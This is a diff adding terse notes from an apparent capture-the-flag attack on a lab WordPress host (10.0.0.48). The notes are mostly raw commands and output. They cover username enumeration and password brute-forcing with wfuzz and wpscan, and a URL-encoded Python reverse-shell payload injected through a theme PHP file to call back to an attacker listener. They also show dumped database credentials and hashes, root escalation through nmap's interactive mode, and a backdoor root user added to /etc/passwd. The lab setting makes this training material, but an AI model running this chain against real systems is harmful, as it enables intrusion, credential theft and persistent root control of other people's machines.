@@ -1,0 +1,77 @@
+http://10.0.0.48/robots.txt
+wget http://10.0.0.48/key-1-of-3.txt
+wget http://10.0.0.48/fsocity.dic
+cat fsocity.dic | sort -u >fsocity.dic-sort-u
+
+wfuzz --sc 500 -w fsocity.dic-sort-u -u "http://10.0.0.48/wp-login.php?action=lostpassword" -d "user_login=FUZZ&redirect_to=&wp-submit=Get+New+Password"
+Target: http://10.0.0.48/wp-login.php?action=lostpassword
+Total requests: 11451
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                                                                  
+===================================================================
+
+000005475:   500        110 L    305 W    3068 Ch     "ELLIOT"                                                                                                                 
+000005474:   500        110 L    305 W    3068 Ch     "Elliot"                                                                                                                 
+000005473:   500        110 L    305 W    3068 Ch     "elliot"
+
+
+wpscan -v -U elliot -P fsocity.dic-sort-u --url http://10.0.0.48/
+[SUCCESS] - elliot / ER28-0652
+
+# to get a shell on port 1234
+nc -lvnp 1234
+wget http://10.0.0.48/wp-content/themes/twentyfifteen/content.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.0.0.148%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+
+
+define('DB_NAME', 'bitnami_wordpress');
+define('DB_USER', 'bn_wordpress');
+define('DB_PASSWORD', '570fd42948');
+define('DB_HOST', 'localhost:3306');
+
+mysql> select * from wp_users;
+mich05654  | $P$BpmKcWWjgC3/UGtj/fO36PsCxYC2E51
+
+wpscan -v -U mich05654 -P fsocity.dic-sort-u --url http://10.0.0.48/
+[SUCCESS] - mich05654 / Dylan_2791
+
+/home/robot/password.raw-md5
+cat /home/robot/password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+robot:abcdefghijklmnopqrstuvwxyz
+su - robot
+
+cat key-2-of-3.txt 
+822c73956184f694993bede3eb39f959
+
+https://gtfobins.github.io/gtfobins/nmap/#shell
+/usr/local/bin/nmap --interactive
+nmap> !sh
+# id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+# ls /root
+firstboot_done  key-3-of-3.txt
+# cat /root/key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+# nano /etc/passwd
+pozo:xxg71OIase7TQ:0:0:pozo:/root:/bin/bash
+exit
+su - pozo
+(password: pozo)
+root@linux:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# we're root but I don't know where's the flag :(
+
+#
+# check later:
+/bin/bitnami_ftp_false
+/etc/crontab
+10 * * * * bitnami cd /opt/bitnami/stats && ./agent.bin --run -D
+
+127.0.0.1:2812
+
+/opt/bitnami/mysql/my.cnf
+
+/opt/bitnami/common/bin/
+
+
